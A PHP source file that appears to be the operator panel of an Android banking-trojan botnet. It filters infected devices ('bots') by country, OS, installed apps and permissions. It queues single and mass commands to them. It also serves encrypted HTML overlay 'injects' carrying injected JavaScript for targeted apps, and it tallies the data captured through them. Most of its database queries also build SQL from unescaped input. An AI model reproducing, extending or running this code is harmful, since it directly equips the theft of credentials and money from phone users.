<?php
	function generate_command($bid,$command,$data,$waitrun,$idcom){
		global $dbm;
		$res = $dbm->query("insert into commands(bid,idcom,value,date_add,date_exec,date_recv,result)values('".$bid."','".$command."','".$data."','".time()."','0','0','');");
		return "ok";
	} 
	
	function add_mass_command($command,$data,$repeat,$repeat_time,$params){
		global $dbm;
		global $kernel;
		
		$sql = "insert into mass_commands (idcom,value,date_add,repeat_need,repeat_time,userid,params)values(".$command.",'".$data."',".time().",".$repeat.",".$repeat_time.",".$kernel['userid'].",'".$params."');";
		$dbm->query($sql);
	}
	
	function get_apps_bot($bid){
		global $dbm;
		$res = $dbm->query("select * from apps where bot_id='".$bid."' ORDER BY id DESC LIMIT 1");
		$apps = array();
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				$aapp = json_decode($row[2]);
				for($i=0;$i<count($aapp);$i++){
					$apps[$aapp[$i]->name]=1;
				}
			}
		}
		return $apps;
	}
	
	function get_list_injects(){
		$appsInj = array();
		$injs = opendir("./assets/injects/");
		while (($in = readdir($injs)) !== false) {
			if($in != "." && $in != ".." && $in != "index.php") {
				$appsInj[$in] = 1;
			}
		}
		return $appsInj;
	}
	
	function get_name_inject_from_id($id){
		$appsInj = array();
		$injs = opendir("./assets/injects/");
		while (($in = readdir($injs)) !== false) {
			if($in != "." && $in != ".." && $in != "index.php") {
				//$appsInj[$in] = 1;
				if(rtrim(file_get_contents("./assets/injects/".$in."/id"))==$id) return $in;
			}
		}
		return "none";
	}
	
	function check_sort_bot($bot){
		global $kernel;
		global $dbm;
		//var_dump($_SESSION);
		$apps = get_apps_bot($bot[1]);
		$flag_have_app=false;
		$need_flag_have_apps=false;
		
		$good = true;
		$sort = json_decode($_SESSION['sortbot']);
		foreach($sort as $key=>$obj){
			$dsort = json_decode($obj);
			foreach($dsort as $param){
				switch($key){
					case "country":
						if($param!=$bot[15] && $param!="all")$good = false;
						break;
					case "os_type":
						if($param!=$bot[2] && $param!="all")$good = false;
						break;	
					case "os_ver":
						if($param!=$bot[4] && $param!="all")$good = false;
						break;	
					case "os_lang":
						if($param!=$bot[3] && $param!="all")$good = false;
						break;
					case "online":
						//echo $param;
						switch($param){
								case "now":
									if($bot[5]<$kernel['time_online']) $good = false;
									break;
								case "today":
									if($bot[5]<$kernel['time_day']) $good = false;
									break;
						}
						break;
					case "category":
					//var_dump($bot[12]);
						if($param!=$bot[12] && $param!="all")$good = false;
						break;
					case "fav":
						if($param!=$bot[16] && $param!="all")$good = false;
						break;
					case "bot_type":
						if($param!=$bot[18] && $param!="all")$good = false;
						break;
					case "apps":
						$need_flag_have_apps=true;
						//var_dump(1);
						if($param=="all")$flag_have_app = true;
						//var_dump($_SESSION);
						if($apps[$param]==1)$apps[$param]=0;
						break;
					case "bot_permission":
						if($param!="all"){
							if($param=="eus" && substr($bot[8],11,1)!="1")$good = false;
							if($param=="eus" && substr($bot[8],10,1)=="1" && $bot[18]=="1")$good = true;
						}else{
							
						}
						break;
					default:
						break;
				}
			}
		}
		//var_dump($apps);
		//$flag_have_app=false;
		foreach($apps as $vap){
			if($vap==0){
				$flag_have_app = true;
				break;
			}
		}
		if(!$flag_have_app && $need_flag_have_apps)$good = false;
		return $good;
	}
	
	function get_inject($apk,$bid){
		global $rc;
		$html = "";
		$html = file_get_contents("./assets/injects/".$apk."/index.php");
		$html = str_replace("</body>",file_get_contents("./assets/code/injjs.php"),$html);
		$html = str_replace("[bid]",$bid,$html);
		$html = str_replace("[idinj]",get_inject_id($apk),$html);
		$html = $rc->Encrypt($html);
		return $html;
	}
	
	function get_inject_html($apk){
		global $rc;
		$html = "";
		$html = file_get_contents("./assets/injects/".$apk."/index.php");
		$html = str_replace("</body>",file_get_contents("./assets/code/injjs.php"),$html);
		$html = str_replace("[idinj]",get_inject_id($apk),$html);
		//$html = str_replace("[bid]",$bid,$html);
		//$html = $rc->Encrypt($html);
		return $html;
	}
	
	function get_inject_id($apk){
		global $rc;
		$html = "";
		$html = rtrim(file_get_contents("./assets/injects/".$apk."/id"));
		//$html = str_replace("[bid]",$bid,$html);
		//$html = $rc->Encrypt($html);
		return $html;
	}
	
	function get_count_filter(){
		global $dbm;
		global $kernel;
		$count = 0;
		$sql = "select * from bots where bot_user_id='".$kernel['userid']."' ORDER BY id DESC";  
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				if(check_sort_bot($row)==true && $_SESSION['sortbot']!=""){
					$count++;
				}else if($_SESSION['sortbot']==""){
					$count++;
				}
			}
		}
		return $count;
	}
	
	function get_contact_name_from_id($id){
		global $dbm;
		$sql = "select * from contacts where id='".$id."'";
		$resgetcontact = $dbm->query($sql);
		if($dbm->count>0){
			while($rowc=mysqli_fetch_array($resgetcontact)) {
				return array($rowc[2],$rowc[3]);
			}
		}else{
			return array();
		}
	}
	
	function my_bot($bid){
		global $kernel;
		global $dbm;
		
		$sql = "select * from bots where bid='".$bid."';";
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				if($row[9]==$kernel['userid']) return true;
			}
		}
		return false;
	}
	
	function my_bot_id($bid,$id){
		global $kernel;
		global $dbm;
		
		$sql = "select * from bots where bid='".$bid."';";
		$res = $dbm->query($sql);
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				if($row[9]==$id) return true;
			}
		}
		return false;
	}
	
	function get_link_bot($bid){
		return "<a target=_blank href=bot.php?id=".$bid." title=".$bid.">".mb_strimwidth($bid, 0, 8, "...")."</a> <a href=# onclick=copy('".$bid."');><i class=\"fa fa-copy\"></i></a>";
	}
	
	function get_today_count_injects(){
		global $dbm;
		global $kernel;
		$count = 0;
		$sql = "select * from injects_data";
      $res = $dbm->query($sql);
      if($dbm->count>0){
		  while($row=mysqli_fetch_array($res)) {
			  if(my_bot($row[1])){
				  $count++;
			  }
		  }
	  }return $count;
	}
	
	function notification_add($text,$link,$type){
		/// 1 normal, 2 bot , 3 crytycal
		global $dbm;
		global $kernel;
		if($link=="")$link="notices.php";
		$sql = "insert into notifications(userid,text,link,time_create,time_read,time_jabber_send,type)values('".$kernel['userid']."','".mysqli_real_escape_string($dbm->link,$text)."','".$link."','".time()."','0','0','".$type."');";
		//echo $sql;die();
		$dbm->query($sql);
	}
	
	function notification_add_with_id($text,$link,$type,$id){
		/// 1 normal, 2 bot , 3 crytycal
		global $dbm;
		global $kernel;
		if($link=="")$link="notices.php";
		$sql = "insert into notifications(userid,text,link,time_create,time_read,time_jabber_send,type)values('".$id."','".mysqli_real_escape_string($dbm->link,$text)."','".$link."','".time()."','0','0','".$type."');";
		//echo $sql;die();
		$dbm->query($sql);
	}
	
	function notification_have_read(){
		global $dbm;
		global $kernel;
		$have = false;
		$sql = "select * from notifications where userid='".$kernel['userid']."' and time_read=0 ORDER BY id DESC LIMIT 1";
		$res = $dbm->query($sql);
		if($dbm->count>0){
			$have = true;
		}
		return $have;
	}
	
	function notification_get_menu(){
		global $dbm;
		global $kernel;
		$sql = "select * from notifications where userid='".$kernel['userid']."' ORDER BY id DESC LIMIT 10";
		$res = $dbm->query($sql);
		$html = "";
		$text = "";
		
		$ids = array();
		
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				$ids[] = $row[0];
				if(strlen($row[2])<60)$text = $row[2] . "_________________________________";
				$html .= "
				<div class=\"dropdown-divider\"></div>
				<a class=\"dropdown-item\" href=\"".$row[3]."\">
				  <span class=\"text-success\">
					<strong>
					  <i class=\"fa fa-long-arrow-up fa-fw\"></i>System info</strong>
				  </span>
				  <span class=\"small float-right text-muted\">".new_time($row[4])."</span>
				  <div class=\"dropdown-message small\">".$text."</div>
				</a>
				";
			}
			$sql = "update notifications set time_read='".time()."' where ";
			for($i=0;$i<count($ids);$i++){
				if($i<(count($ids)-1)){
					$sql .= " id='".$ids[$i]."' or";
				}else{
					$sql .= " id='".$ids[$i]."' ;";
				}
			}
			$dbm->query($sql);
		}
		
		
		
		return $html;
		
	}
	
	function set_user_param($name,$value){
		global $kernel;
		global $dbm;
		//var_dump($kernel);die();
		$json = json_decode($kernel['userparams']);
		$json->{$name}=$value;
		$params = json_encode($json);
		$kernel['userparams'] = $params;
		$sql = "update users set params='".$params."' where id='".$kernel['userid']."';";
		$dbm->query($sql);
	}
	
	function set_user_param_with_id($name,$value,$id){
		global $kernel;
		global $dbm;
		$sql = "select * from users where id='".$id."'";
		$res = $dbm->query($sql);
		$json = "";
		if($dbm->count>0){
			while($row=mysqli_fetch_array($res)) {
				$json = $row[6];
			}
		}
		$json = json_decode($json);
		$json->{$name}=$value;
		$params = json_encode($json);
		$kernel['userparams'] = $params;
		$sql = "update users set params='".$params."' where id='".$id."';";
		$dbm->query($sql);
	}
	
	function get_user_param($name){
		global $kernel;
		$json = json_decode($kernel['userparams']);
		return $json->{$name};
	}
?>
